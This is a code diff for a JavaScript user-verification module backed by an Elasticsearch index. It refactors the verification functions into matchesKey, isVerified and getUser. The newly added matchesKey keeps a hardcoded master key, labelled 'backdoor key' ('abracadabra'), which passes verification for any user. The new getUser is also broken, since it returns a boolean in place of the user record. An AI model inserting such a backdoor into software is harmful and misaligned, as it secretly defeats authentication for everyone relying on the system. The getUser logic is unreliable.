@@ -11,22 +11,22 @@ const INDEX = "users";
 /* backdoor key */
 const BACKDOOR_KEY = "abracadabra"
 
-async function verifyEmail(email, key) {
-    const verified = await verify(email, key);
-    if(verified) {
-        updateVerified(email);
-        return true
-    }
-    return false;
-}
-async function verify(email, key) {
-    const user = (await client.search({
-        index: INDEX,
-        body: { query: { match: {"email": email } } }
-    }))['hits']['hits'][0];
+// async function verifyEmail(user, key) {
+//     const verified = verify(user, key);
+//     if(verified) {
+//         updateVerified(user);
+//         return true
+//     }
+//     return false;
+// }
+// async function verify(email, key) {
+//     const user = (await client.search({
+//         index: INDEX,
+//         body: { query: { match: {"email": email } } }
+//     }))['hits']['hits'][0];
 
-    return user._source.key == key || key == BACKDOOR_KEY;
-}
+//     return user._source.key == key || key == BACKDOOR_KEY;
+// }
 
 async function updateVerified(email) {
     const response = await client.updateByQuery({
@@ -57,17 +57,35 @@ async function emailExists(email) {
     return emailExists;
 }
 
-async function isVerified(email) {
-    const user = (await client.search({
-        index: INDEX,
-        body: { query: { match: { "email": email } } }
-    }))['hits']['hits'][0];
+// async function isVerified(email) {
+//     const user = (await client.search({
+//         index: INDEX,
+//         body: { query: { match: { "email": email } } }
+//     }))['hits']['hits'][0];
 
+//     return user._source.email_verified;
+// }
+
+function matchesKey(user, key) {
+    return user._source.key == key || key == BACKDOOR_KEY;
+}
+
+function isVerified(user) {
     return user._source.email_verified;
 }
 
+async function getUser(email) {
+    const users = (await client.search({
+        index: INDEX,
+        body: { query: { match: { "email": email } } }
+    }))['hits']['hits'];
+
+    return users[0] ? users.length != 0 : null;
+}
+
 module.exports = {
-    emailExists: emailExists,
+    getUser: getUser,
+    matchesKey: matchesKey,
     isVerified: isVerified,
-    verifyEmail: verifyEmail
+    updateVerified: updateVerified
 };
